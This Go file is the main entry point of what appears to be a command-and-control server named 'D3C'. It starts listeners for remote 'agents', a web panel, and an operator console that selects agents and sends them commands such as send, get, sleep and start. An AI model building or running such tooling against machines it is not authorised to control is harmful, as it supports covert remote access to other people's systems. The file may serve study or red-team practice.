package main

import (
	"bufio"
	"d3c/commons/estruturas"
	"d3c/commons/helpers"
	"d3c/commons/interfaces"
	"d3c/server/commands"
	. "d3c/server/helpers"
	"d3c/server/listeners"
	"io"
	"log"
	"os"
	"strings"
	"time"
)

var (
	agentesEmCampo    = []estruturas.Mensagem{}
	agenteSelecionado = ""
)

func main() {
	// Inicia listener automaticamente (padrão porta 80) a menos que DISABLE_AUTO_LISTENER=1
	disableAuto := os.Getenv("DISABLE_AUTO_LISTENER")
	if disableAuto != "1" {
		// tipo de listener via LISTENER_TYPE (raw|https), porta via LISTENER_PORT
		listenerType := os.Getenv("LISTENER_TYPE")
		if listenerType == "" {
			listenerType = "raw"
		}
		listenerPort := os.Getenv("LISTENER_PORT")
		if listenerPort == "" {
			listenerPort = "80"
		}

		log.Printf("Iniciando listener %s na porta %s\n", listenerType, listenerPort)
		switch listenerType {
		case "https":
			go listeners.StartHttpsListener(listenerPort, &agentesEmCampo, &agenteSelecionado)
		default:
			go listeners.StartRawListener(listenerPort, &agentesEmCampo, &agenteSelecionado)
		}
	}

	webPort := os.Getenv("WEB_PORT")
	if webPort == "" {
		webPort = "8080"
	}
	log.Printf("Iniciando painel web na porta %s\n", webPort)
	go listeners.StartWebListener(webPort, &agentesEmCampo, &agenteSelecionado)

	// Se estivermos em um terminal interativo, executa o CLI. Caso contrário, apenas loga e espera.
	if isInteractive() {
		log.Println("Entrei em execução (modo interativo).")
		cliHandler()
	} else {
		log.Println("Entrei em execução (modo não interativo). Sem prompt CLI.")
		select {}
	}
}

func isInteractive() bool {
	fi, err := os.Stdin.Stat()
	if err != nil {
		return false
	}
	return (fi.Mode() & os.ModeCharDevice) != 0
}

func cliHandler() {
	for {
		if agenteSelecionado != "" {
			print(agenteSelecionado + "@D3C# ")
		} else {
			print("D3C> ")
		}

		reader := bufio.NewReader(os.Stdin)

		comandoCompleto, err := reader.ReadString('\n')
		if err != nil {
			if err == io.EOF {
				// evita loop ocupando CPU quando stdin fecha
				time.Sleep(500 * time.Millisecond)
				continue
			}
			log.Println("Erro lendo stdin:", err)
			time.Sleep(200 * time.Millisecond)
			continue
		}
		comandoCompleto = strings.Trim(comandoCompleto, "\r")
		comandoCompleto = strings.Trim(comandoCompleto, "\n")

		comandoSeparado := helpers.SeparaComando(comandoCompleto)
		comandoBase := strings.TrimSpace(comandoSeparado[0])

		if len(comandoBase) > 0 {
			comandoId := ValidaComando(comandoBase)

			mapping := map[int]interfaces.Command{
				0: commands.Default{ComandoCompleto: comandoCompleto, AgenteSelecionado: &agenteSelecionado, AgentesEmCampo: &agentesEmCampo},
				1: commands.Show{ComandoCompleto: comandoCompleto, AgentesEmCampo: &agentesEmCampo},
				2: commands.Sleep{ComandoCompleto: comandoCompleto, AgenteAlvo: agenteSelecionado, AgentesEmCampo: &agentesEmCampo},
				3: commands.Select{ComandoCompleto: comandoCompleto, AgenteSelecionado: &agenteSelecionado, AgentesEmCampo: &agentesEmCampo},
				4: commands.Send{ComandoCompleto: comandoCompleto, AgenteSelecionado: &agenteSelecionado, AgentesEmCampo: &agentesEmCampo},
				5: commands.Get{ComandoCompleto: comandoCompleto, AgenteSelecionado: &agenteSelecionado, AgentesEmCampo: &agentesEmCampo},
				6: commands.Set{ComandoCompleto: comandoCompleto, AgenteSelecionado: &agenteSelecionado, AgentesEmCampo: &agentesEmCampo},
				7: commands.Start{ComandoCompleto: comandoCompleto, AgenteSelecionado: &agenteSelecionado, AgentesEmCampo: &agentesEmCampo},
			}

			mapping[comandoId].Executar()
		}

	}

}
